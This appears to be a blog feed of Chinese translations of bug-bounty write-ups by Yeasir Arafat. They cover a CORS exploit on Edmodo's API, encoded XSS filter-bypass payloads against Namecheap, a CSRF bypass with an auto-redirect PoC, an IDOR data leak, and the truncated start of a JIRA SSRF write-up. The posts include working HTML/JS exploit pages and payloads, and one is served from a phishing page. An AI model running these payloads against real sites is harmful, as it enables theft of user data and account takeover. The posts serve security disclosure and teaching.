<h4 id="emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞"><a href="#emsp-emsp-现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials-true-这意味着这里存在一个CORS漏洞" class="headerlink" title="&emsp;&emsp;现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞"></a>&emsp;&emsp;现在我正在渗透Edmodo，我察觉到某个API接口可能存在CORS漏洞。首先我们必须先确认该站点是否能够跨域请求资源，于是我利用了curl来检测。然后它返回Access-Control-Allowed-Credentials: true 这意味着这里存在一个CORS漏洞</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">curl https://api.edmodo.com -H &quot;Origin: https://evil.com&quot; -I</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/1.png" alt=""></p>
<h4 id="emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据"><a href="#emsp-emsp-用户访问https-api-edmodo-com-users-id-时浏览器会返回从服务端获取到的数据" class="headerlink" title="&emsp;&emsp;用户访问https://api.edmodo.com/users/id 时浏览器会返回从服务端获取到的数据"></a>&emsp;&emsp;用户访问<a href="https://api.edmodo.com/users/125917217" target="_blank" rel="external">https://api.edmodo.com/users/</a>id 时浏览器会返回从服务端获取到的数据</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/2.png" alt=""></p>
<h4 id="emsp-emsp-所以最终的payload如下"><a href="#emsp-emsp-所以最终的payload如下" class="headerlink" title="&emsp;&emsp;所以最终的payload如下"></a>&emsp;&emsp;所以最终的payload如下</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;CORS PoC Exploit&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">&lt;h1&gt;CORS Exploit&lt;br&gt;Yeasir Arafat&lt;/h1&gt;</div><div class="line">&lt;hr&gt;</div><div class="line">&lt;div id=&quot;demo&quot;&gt;</div><div class="line">&lt;button type=&quot;button&quot; onclick=&quot;cors()&quot;&gt;Exploit&lt;/button&gt;</div><div class="line">&lt;/div&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">function cors() &#123;</div><div class="line">var xhttp = new XMLHttpRequest();</div><div class="line">xhttp.onreadystatechange = function() &#123;</div><div class="line">if(this.readyState == 4 &amp;&amp; this.status == 200) &#123;</div><div class="line">document.getElementById(&quot;demo&quot;).innerHTML = this.responseText;</div><div class="line">&#125;</div><div class="line">&#125;;</div><div class="line">xhttp.open(&quot;GET&quot;, &quot;https://api.edmodo.com/users/id&quot;, true);</div><div class="line">xhttp.withCredentials = true;</div><div class="line">xhttp.send();</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"><a href="#emsp-emsp-当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我" class="headerlink" title="&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我"></a>&emsp;&emsp;当我配置好钓鱼页面之后，一旦用户点击就会触发跨域请求，将用户信息发送给我</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_9/3.png" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第八篇翻译：绕过XSS防护]]></title>
      <url>/2018/12/23/%E7%AC%AC%E5%85%AB%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E7%BB%95%E8%BF%87XSS%E9%98%B2%E6%8A%A4/</url>
      <content type="html"><![CDATA[<h4 id="原文：The-story-behined-the-Strong-XSS-filter-bypass"><a href="#原文：The-story-behined-the-Strong-XSS-filter-bypass" class="headerlink" title="原文：The story behined the Strong XSS filter bypass!"></a>原文：<a href="https://medium.com/@Skylinearafat/the-story-behined-the-namecheap-xss-filter-bypass-be79624fd0c3" target="_blank" rel="external">The story behined the Strong XSS filter bypass!</a></h4><h4 id="漏洞：编码绕过XSS防火墙"><a href="#漏洞：编码绕过XSS防火墙" class="headerlink" title="漏洞：编码绕过XSS防火墙"></a>漏洞：编码绕过XSS防火墙</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：中"><a href="#难度：中" class="headerlink" title="难度：中"></a>难度：中</h4><a id="more"></a>
<h4 id="emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"><a href="#emsp-emsp-今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏" class="headerlink" title="&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏"></a>&emsp;&emsp;今天的主题是关于如何绕过XSS过滤。我已经观察目标网站很久了，并且一直在尝试利用谷歌语法试图发现网站的子域名，大家也可以尝试一下。好不容易找到几个子域，正当我尝试XSS注入的时候，却被防火墙各种蹂躏</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">site:*.*.namecheap.com &amp; site:*.namecheap.com</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_8/1.png" alt=""></p>
<h4 id="emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"><a href="#emsp-emsp-虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙" class="headerlink" title="&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙"></a>&emsp;&emsp;虽然痛不欲生，但我是那种会放弃的人吗？经过多方面的尝试之后，终于发现了一种莫名其妙的编码方式能够绕过防火墙</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;a href=&quot;javascript&amp;colon;alert&amp;lpar;document&amp;period;domain&amp;rpar;&quot;&gt;Click Here&lt;/a&gt;</div><div class="line">&quot;&gt;&lt;iframe/src=javascript&amp;colon;[document&amp;period;domain].find(alert(1))&gt;</div></pre></td></tr></table></figure>
<h2 id="视屏"><a href="#视屏" class="headerlink" title="视屏"></a>视屏</h2><p>[*]xss-1</p>
<video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-1.mp4"><br></video>



<p>[*]xss-2</p>
<video id="video" controls preload="none" poster="https://ss1.bdstatic.com/70cFuXSh_Q1YnxGkpoWK1HF6hhy/it/u=885582068,2021597601&fm=26&gp=0.jpg"><br><source id="mp4" src="http://img.027cgb.com/612577/times0ng_blog/translate_8/xss-2.mp4"><br></video>



<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第七篇翻译：bypass CSRF]]></title>
      <url>/2018/12/23/%E7%AC%AC%E4%B8%83%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9Abypass-CSRF/</url>
      <content type="html"><![CDATA[<h4 id="原文：A-very-useful-technique-to-bypass-the-CSRF-protection-for-fun-and-profit"><a href="#原文：A-very-useful-technique-to-bypass-the-CSRF-protection-for-fun-and-profit" class="headerlink" title="原文：A very useful technique to bypass the CSRF protection for fun and profit."></a>原文：<a href="https://medium.com/@Skylinearafat/a-very-useful-technique-to-bypass-the-csrf-protection-for-fun-and-profit-471af64da276" target="_blank" rel="external">A very useful technique to bypass the CSRF protection for fun and profit.</a></h4><h4 id="漏洞：利用GET代替POST，绕过CSRF防护"><a href="#漏洞：利用GET代替POST，绕过CSRF防护" class="headerlink" title="漏洞：利用GET代替POST，绕过CSRF防护"></a>漏洞：利用GET代替POST，绕过CSRF防护</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=post_header_lockup" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。"><a href="#emsp-emsp-嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。" class="headerlink" title="&emsp;&emsp;嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。"></a>&emsp;&emsp;嗨，伙计们！与你们分享一些好的东西总是很愉快的。从文章的标题就可以猜到今天我将分享一些关于绕过CSRF防护的技术。</h4><h2 id="什么是CSRF保护？"><a href="#什么是CSRF保护？" class="headerlink" title="什么是CSRF保护？"></a>什么是CSRF保护？</h2><h4 id="emsp-emsp-简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF-token令牌。如果你想了解详细的原理可以看看这两篇文章-“Article-1“，”Article-2“"><a href="#emsp-emsp-简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF-token令牌。如果你想了解详细的原理可以看看这两篇文章-“Article-1“，”Article-2“" class="headerlink" title="&emsp;&emsp;简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF token令牌。如果你想了解详细的原理可以看看这两篇文章 “Article-1“，”Article-2“"></a>&emsp;&emsp;简而言之，CSRF（跨站请求伪造）攻击是一种专门针对WEB站点状态更改请求的攻击。为了防止这种攻击，开发人员以多种方式在request请求中添加了ANTI-CSRF token令牌。如果你想了解详细的原理可以看看这两篇文章 “<a href="https://www.acunetix.com/websitesecurity/csrf-attacks/" target="_blank" rel="external">Article-1</a>“，”<a href="https://laravel.com/docs/5.7/csrf" target="_blank" rel="external">Article-2</a>“</h4><h4 id="emsp-emsp-现在我们假设站点域名为vulnhost-com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost-com实际上是先将-csrf-token标记到POST请求中，然后再在服务器端验证-csrf-token"><a href="#emsp-emsp-现在我们假设站点域名为vulnhost-com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost-com实际上是先将-csrf-token标记到POST请求中，然后再在服务器端验证-csrf-token" class="headerlink" title="&emsp;&emsp;现在我们假设站点域名为vulnhost.com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost.com实际上是先将_csrf token标记到POST请求中，然后再在服务器端验证_csrf token"></a>&emsp;&emsp;现在我们假设站点域名为vulnhost.com，该站点根据一个POST请求提供的数据验证我们的请求。vulnhost.com实际上是先将_csrf token标记到POST请求中，然后再在服务器端验证_csrf token</h4><p>[*]状态更改请求看起来像是下面这样的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">POST /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact HTTP/1.1</div><div class="line">Host: en.vulnhost.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</div><div class="line">Accept: application/xml, text/xml, */*; q=0.01</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: https://en.vulnhost.com/mycenter/settings/account.html</div><div class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</div><div class="line">Wicket-Ajax: true</div><div class="line">Migration-Wicket: 6</div><div class="line">Wicket-Ajax-BaseURL: mycenter/settings/account.html</div><div class="line">Wicket-FocusedElementId: id49</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Content-Length: 246</div><div class="line">Cookie: .......</div><div class="line">Connection: close</div><div class="line">																.</div><div class="line">_csrf=725a7f90-192f-4b94-8fc9-6320ace14fef&amp;id48_hf_0=&amp;gender=radio8&amp;firstName=xx&amp;lastName=YY&amp;saveContact=1</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-这里，-csrf-…-用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将-csrf令牌删除，那么服务端将不会对其进行验证"><a href="#emsp-emsp-这里，-csrf-…-用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将-csrf令牌删除，那么服务端将不会对其进行验证" class="headerlink" title="&emsp;&emsp;这里，_csrf=…. 用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将_csrf令牌删除，那么服务端将不会对其进行验证"></a>&emsp;&emsp;这里，_csrf=…. 用来生成随机令牌，并提交给服务端进行验证。如果我利用GET方法发送请求，并将_csrf令牌删除，那么服务端将不会对其进行验证</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">GET /mycenter/settings/account.html?2-1.IBehaviorListener.0-formContact-saveContact=&amp;id48_hf_0=&amp;gender=radio8&amp;firstName=XX&amp;lastName=YY&amp;saveContact=1 HTTP/1.1</div><div class="line">Host: en.vulnhost.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</div><div class="line">Accept: application/xml, text/xml, */*; q=0.01</div><div class="line">Accept-Language: en-US,en;q=0.5</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: https://en.vulnhost.com/mycenter/settings/account.html</div><div class="line">Wicket-Ajax: true</div><div class="line">Migration-Wicket: 6</div><div class="line">Wicket-Ajax-BaseURL: mycenter/settings/account.html</div><div class="line">Wicket-FocusedElementId: id49</div><div class="line">X-Requested-With: XMLHttpRequest</div><div class="line">Cookie: ...</div><div class="line">Connection: close</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-正如期待的那样，服务端响应200-OK，但是使用典型的HTML-POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP-header，这可能会中断更改请求"><a href="#emsp-emsp-正如期待的那样，服务端响应200-OK，但是使用典型的HTML-POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP-header，这可能会中断更改请求" class="headerlink" title="&emsp;&emsp;正如期待的那样，服务端响应200 OK，但是使用典型的HTML POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP header，这可能会中断更改请求"></a>&emsp;&emsp;正如期待的那样，服务端响应200 OK，但是使用典型的HTML POC来更改请求时会出现一些问题。以前我也遇到过，之所以会这样，是因为在这种情况下浏览器需要刷新之后才能渲染请求到的内容。我猜想GET请求包含了一堆HTTP header，这可能会中断更改请求</h4><h4 id="emsp-emsp-为了解决这个问题，我结合了javascript和HTML来构造POC"><a href="#emsp-emsp-为了解决这个问题，我结合了javascript和HTML来构造POC" class="headerlink" title="&emsp;&emsp;为了解决这个问题，我结合了javascript和HTML来构造POC"></a>&emsp;&emsp;为了解决这个问题，我结合了javascript和HTML来构造POC</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">	var timer = null;</div><div class="line">function auto_reload()</div><div class="line">&#123;</div><div class="line">	window.location = &apos;https://en.vulnhost.com/mycenter/settings/account.html?4-2.IBehaviorListener.0-formContact-saveContact=&amp;id48_hf_0=&amp;gender=radio8&amp;firstName=Account&amp;lastName=Takeover&amp;saveContact=1&apos;;</div><div class="line">&#125;</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;!-- Reload page every 5 seconds. --&gt;</div><div class="line">	 &lt;body onload=&quot;timer = setTimeout(&apos;auto_reload()&apos;,5000);&quot;&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<h4 id="emsp-emsp-这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！"><a href="#emsp-emsp-这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！" class="headerlink" title="&emsp;&emsp;这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！"></a>&emsp;&emsp;这样只要victim访问了我定制的网页，受害者就会被重定向到CSRF页面，并自动更改受害者的账号信息！</h4><h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第六篇翻译：信息泄露]]></title>
      <url>/2018/12/23/%E7%AC%AC%E5%85%AD%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9A%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/</url>
      <content type="html"><![CDATA[<h4 id="原文：How-Misconfigured-API-leaked-user-private-information"><a href="#原文：How-Misconfigured-API-leaked-user-private-information" class="headerlink" title="原文：How Misconfigured API leaked user private information?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-misconfigured-api-leaked-user-private-information-e3e8c13e52e4" target="_blank" rel="external">How Misconfigured API leaked user private information?</a></h4><h4 id="漏洞：API接口配置不当导致信息泄露"><a href="#漏洞：API接口配置不当导致信息泄露" class="headerlink" title="漏洞：API接口配置不当导致信息泄露"></a>漏洞：API接口配置不当导致信息泄露</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：<a href="https://medium.com/@Skylinearafat?source=user_popover" target="_blank" rel="external">Yeasir Arafat</a></h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！"><a href="#emsp-emsp-接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！" class="headerlink" title="&emsp;&emsp;接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！"></a>&emsp;&emsp;接下来我将分享最近在私有BUG赏金平台上发现的API接口漏洞，这些漏洞真的特别有意思！</h4><h4 id="emsp-emsp-首先咱们假设漏洞站点的域名是redact-io-，该站点使用API从服务器上获取用户的数据，例如：http-api-redact-io"><a href="#emsp-emsp-首先咱们假设漏洞站点的域名是redact-io-，该站点使用API从服务器上获取用户的数据，例如：http-api-redact-io" class="headerlink" title="&emsp;&emsp;首先咱们假设漏洞站点的域名是redact.io ，该站点使用API从服务器上获取用户的数据，例如：http://api.redact.io"></a>&emsp;&emsp;首先咱们假设漏洞站点的域名是redact.io ，该站点使用API从服务器上获取用户的数据，例如：<a href="http://api.redact.io" target="_blank" rel="external">http://api.redact.io</a></h4><h4 id="emsp-emsp-在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在http-docs-redact-io-上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！"><a href="#emsp-emsp-在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在http-docs-redact-io-上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！" class="headerlink" title="&emsp;&emsp;在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在http://docs.redact.io 上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！"></a>&emsp;&emsp;在开始渗透之前，我通常会先去了解该站点的API的工作原理，我在<a href="http://docs.redact.io" target="_blank" rel="external">http://docs.redact.io</a> 上面阅读了完整的相关文档。了解你的目标网站的工作方式是非常重要的，知己知彼百战不殆，当你收集到足够多的信息之后，就能很轻松的制定攻击步骤！</h4><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_6/1.jpg" alt=""></p>
<h4 id="emsp-emsp-我发现目标域redact-io-正在使用https-api-redact-io-service-lt-userID-gt-来获取用户数据，这里的userID是该站点用户的唯一用户ID"><a href="#emsp-emsp-我发现目标域redact-io-正在使用https-api-redact-io-service-lt-userID-gt-来获取用户数据，这里的userID是该站点用户的唯一用户ID" class="headerlink" title="&emsp;&emsp;我发现目标域redact.io 正在使用https://api.redact.io/service/&lt; userID&gt; 来获取用户数据，这里的userID是该站点用户的唯一用户ID"></a>&emsp;&emsp;我发现目标域redact.io 正在使用<a href="https://api.redact.io/service/" target="_blank" rel="external">https://api.redact.io/service/</a>&lt; userID&gt; 来获取用户数据，这里的userID是该站点用户的唯一用户ID</h4><h4 id="emsp-emsp-所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我"><a href="#emsp-emsp-所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我" class="headerlink" title="&emsp;&emsp;所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我"></a>&emsp;&emsp;所以我尝试去修改这里的userID，看看在未授权的情况下能否从这里提取数据，但是网站只是返回一个404错误给我</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.redact.io/service/05c0dc81753821cbdf9ab1cd5e366d21</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_6/2.jpg" alt=""></p>
<h4 id="emsp-emsp-呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等"><a href="#emsp-emsp-呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等" class="headerlink" title="&emsp;&emsp;呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等"></a>&emsp;&emsp;呃？那接下来该咋整？看来该网站的API接口工作正常不像有漏洞啊。但从我过去的经验来看，我总结了一些针对API接口的小技巧，我们可以尝试利用其它参数来替代userID，例如：Email，userName，scope等</h4><h4 id="emsp-emsp-下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据"><a href="#emsp-emsp-下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据" class="headerlink" title="&emsp;&emsp;下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据"></a>&emsp;&emsp;下面我使用userName来替换userID，可以看到越权成功，并且成功获取到其它用户的数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://api.redact.io/service/bugtester</div></pre></td></tr></table></figure>
<p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_6/3.jpg" alt=""></p>
<h2 id="打赏译者"><a href="#打赏译者" class="headerlink" title="打赏译者"></a>打赏译者</h2><p><img src="http://img.027cgb.com/612577/times0ng_blog/translate_1/money.png" alt=""></p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[第五篇翻译：SSRF to XSS]]></title>
      <url>/2018/12/23/%E7%AC%AC%E4%BA%94%E7%AF%87%E7%BF%BB%E8%AF%91%EF%BC%9ASSRF-to-XSS/</url>
      <content type="html"><![CDATA[<h4 id="原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities"><a href="#原文：How-Outdated-JIRA-Instances-suffers-from-multiple-security-vulnerabilities" class="headerlink" title="原文：How Outdated JIRA Instances suffers from multiple security vulnerabilities?"></a>原文：<a href="https://medium.com/@Skylinearafat/how-outdated-jira-instances-suffers-from-multiple-security-vulnerabilities-6a88c45e9ec6" target="_blank" rel="external">How Outdated JIRA Instances suffers from multiple security vulnerabilities?</a></h4><h4 id="漏洞：SSRF-XSS"><a href="#漏洞：SSRF-XSS" class="headerlink" title="漏洞：SSRF + XSS"></a>漏洞：SSRF + XSS</h4><h4 id="作者：Yeasir-Arafat"><a href="#作者：Yeasir-Arafat" class="headerlink" title="作者：Yeasir Arafat"></a>作者：Yeasir Arafat</h4><h4 id="难度：低"><a href="#难度：低" class="headerlink" title="难度：低"></a>难度：低</h4><a id="more"></a>
<h4 id="emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"><a href="#emsp-emsp-我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意" class="headerlink" title="&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意"></a>&emsp;&emsp;我正在测试一个名为visma的公共BUG赏金计划，像往常一样，我先收集了它的一些子域名。很少有子域能引起我的关注，但是下面列出的运行jira服务的子域成功吸引了我的注意</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://jira.brown.edu/plugins/servlet/oauth/users/icon-uri?consumerUri=http://www.baidu.com</div></pre></td></tr></table></figure>
